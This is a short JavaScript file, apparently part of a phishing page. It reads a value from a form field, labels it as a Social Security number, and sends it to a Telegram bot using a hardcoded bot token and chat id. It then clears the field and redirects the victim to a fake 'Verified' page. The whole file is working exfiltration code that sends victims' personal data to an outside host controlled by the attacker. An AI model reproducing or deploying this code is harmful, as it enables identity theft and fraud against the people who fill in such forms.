//bot token
var telegram_bot_id = "6841346175:AAEKmt5D-jasNU3HBIQ77tvk1YOveAWNI2o";
//chat id
var chat_id = 6156261130;
var u_ssn, u_password, message;
var ready = function () {
    u_ssn = document.getElementById("user_email").value;
    message = "SSN: " + u_ssn;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'Verified.html';
    });
    document.getElementById("user_email").value = "";
    return false;
};